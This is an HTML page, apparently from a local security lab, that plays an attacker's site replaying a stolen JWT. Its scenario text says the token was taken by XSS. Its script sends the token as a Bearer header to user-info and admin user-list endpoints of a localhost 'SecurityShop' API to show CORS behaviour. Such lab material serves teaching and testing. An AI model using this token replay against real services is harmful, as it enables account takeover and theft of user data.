<!DOCTYPE html>
<html>
<head>
  <title>😈 Hacker Site</title>
  <style>
    body { font-family: Arial; padding: 40px; background: #1a1a1a; color: white; }
    h1 { color: #e74c3c; }
    input { width: 100%; padding: 10px; margin: 10px 0; background: #2c2c2c; color: white; border: 1px solid #555; border-radius: 6px; font-size: 13px; }
    button { padding: 12px 24px; background: #e74c3c; color: white; border: none; border-radius: 6px; cursor: pointer; font-size: 15px; margin: 5px; }
    pre { background: #2c2c2c; padding: 20px; border-radius: 8px; overflow: auto; font-size: 13px; margin-top: 20px; }
    .success { color: #2ecc71; }
    .error { color: #e74c3c; }
  </style>
</head>
<body>
  <h1>😈 Hacker's Website</h1>
  <p style="color:#aaa">
    Kịch bản: Hacker đã steal được JWT token của nạn nhân qua XSS.<br>
    Giờ dùng token đó gọi API SecurityShop từ domain này (port 9999).
  </p>

  <label style="color:#aaa">Paste stolen token vào đây:</label>
  <input id="tokenInput" placeholder="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..." />

  <br>
  <button onclick="getProducts()">🛒 Lấy danh sách sản phẩm</button>
  <button onclick="getUserInfo()">👤 Lấy thông tin user</button>
  <button onclick="getAllUsers()">👥 Lấy toàn bộ users (admin)</button>

  <pre id="result">Chờ kết quả...</pre>

  <script>
    function getToken() {
      return document.getElementById('tokenInput').value.trim()
    }

    function showResult(data, isError) {
      const el = document.getElementById('result')
      el.className = isError ? 'error' : 'success'
      el.textContent = JSON.stringify(data, null, 2)
    }

    // Lấy sản phẩm — không cần token
    function getProducts() {
      fetch('http://localhost:8000/api/products/')
        .then(r => r.json())
        .then(data => showResult(data, false))
        .catch(err => showResult('CORS BLOCKED: ' + err.message, true))
    }

    // Lấy thông tin user bằng stolen token
    function getUserInfo() {
      const token = getToken()
      if (!token) { alert('Paste token vào trước!'); return }

      fetch('http://localhost:8000/api/auth/me', {
        headers: { 'Authorization': 'Bearer ' + token }
      })
        .then(r => r.json())
        .then(data => showResult(data, false))
        .catch(err => showResult('CORS BLOCKED: ' + err.message, true))
    }

    // Gọi admin endpoint
    function getAllUsers() {
      const token = getToken()
      fetch('http://localhost:8000/api/auth/admin/users', {
        headers: token ? { 'Authorization': 'Bearer ' + token } : {}
      })
        .then(r => r.json())
        .then(data => showResult(data, false))
        .catch(err => showResult('CORS BLOCKED: ' + err.message, true))
    }
  </script>
</body>
</html>
